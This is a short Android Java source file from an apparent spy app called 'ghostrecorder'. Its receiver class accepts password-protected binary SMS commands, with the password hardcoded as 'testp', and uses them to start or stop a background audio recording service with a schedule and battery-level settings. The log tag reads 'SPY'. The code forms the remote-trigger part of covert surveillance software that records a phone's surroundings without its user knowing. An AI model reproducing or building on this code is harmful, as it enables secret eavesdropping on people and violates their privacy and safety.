package com.byteshaft.ghostrecorder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BinarySmsReceiver extends BroadcastReceiver {

    private String currentPassword = "testp";
    private final String LOG_TAG = "SPY";

    private static class Commands {
        private static String START = "start";
        private static String STOP = "stop";
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Helpers helpers = new Helpers();
        String incomingCommand = helpers.decodeIncomingSmsText(intent);
        String[] smsCommand = incomingCommand.split("_");

        if (smsCommand.length < 5) {
            Log.e(LOG_TAG, "Incomplete command.");
            return;
        }

        Intent smsServiceIntent = new Intent(
                context.getApplicationContext(), AudioRecorderService.class);

        String password = smsCommand[0];
        String action = smsCommand[1];
        String schedule = smsCommand[2];
        String battery_level = smsCommand[3];
        String response = smsCommand[4];

        if (!password.equals(currentPassword)) {
            Log.e(LOG_TAG, "Wrong password.");
            return;
        }

        if (action.equals(Commands.START)) {
            smsServiceIntent.putExtra("STATE", "start");
        } else if (action.equals(Commands.STOP)) {
            smsServiceIntent.putExtra("STATE", "stop");
        } else {
            Log.e(LOG_TAG, "Invalid command.");
            return;
        }

        smsServiceIntent.putExtra("PASSWORD", password);
        smsServiceIntent.putExtra("RECORD_TIME", schedule);
        smsServiceIntent.putExtra("BATTERY_LEVEL", battery_level);
        smsServiceIntent.putExtra("RESPONSE", response);
        context.startService(smsServiceIntent);
    }
}
